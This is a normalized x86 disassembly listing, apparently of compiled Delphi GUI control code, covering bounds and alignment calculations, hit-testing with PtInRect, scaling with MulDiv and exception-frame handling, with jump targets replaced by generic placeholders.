mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_441a8c
sub_44243a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_440cec
mov cl 0x1
sub_44247c
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_440a44
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_440a44
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4424ac
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4424d0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406cd4
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403418
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_441a58
mov [ ebx + 0xc ] eax
sub_442574
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_440998
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_440998
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_442608
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403164
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_440038
mov edx [ esp ]
mov eax esi
call sub_440014
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4402c0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_440304
sub_44268c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_418d40
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_4403bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_418d90
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_440264
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442718
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_442608
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4470c4
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44268c
pop ecx
jmp r-xdata
sub_442778
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_442866
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44286d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4408d4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4408a4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4408a4
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404378
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403fc0
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4407c4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_442874
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403418
sub_4428a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4428c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4428e0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442900
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442920
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442940
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_442960
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41ff8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43fef8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403418
sub_442998
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442a34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a824
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44d228
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44d360
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44d0c0
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44d480
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442a3b
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_442a44
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_442a80
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_442a44
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_442b30
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033a8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_442b64
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_442b84
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403418
test al al
je r-xdata
mov eax edi
call sub_442bc4
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_442bf0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_442c1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406cd4
mov eax esp
call sub_418db8
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4403e8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403418
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403418
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_440414
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_418db8
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_418d40
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_4403bc
sub_442d44
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_442d84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f5e8
mov eax esi
mov edx [ r-xdata ]
call sub_4033cc
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_442db8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_442eb0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43f9a4
push ebx
push sub_444848
call sub_420bcc
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4234dc
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_423684
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403540
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e35c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403fc0
lea eax [ ebx + 0x188 ]
call sub_403f6c
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442eb7
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_442eb7
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_442edc
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
mov eax edi
call sub_41fddc
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_40599c
mov eax [ edi + 0x178 ]
call sub_40321c
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43e550
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_443b7c
mov eax edi
call sub_443dbc
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_40321c
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_443d80
mov esi eax
mov edx esi
mov eax edi
call sub_443be8
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_443dbc
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43fa7c
test bl bl
jle r-xdata
call sub_420c64
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_442fac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_443070
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41a33c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40321c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_447284
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a19c
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41a290
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a19c
test eax eax
je r-xdata
sub_443080
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443924
xor eax eax
push ebp
push sub_4430c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4430c7
mov eax [ ebp - 0x4 ]
call sub_44392c
retn
sub_4430c7
mov eax [ ebp - 0x4 ]
call sub_442fac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444780
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_441a58
sub_4430fc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_443117 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_443188
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4473c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_418d40
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_443509
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443510
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44341e ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
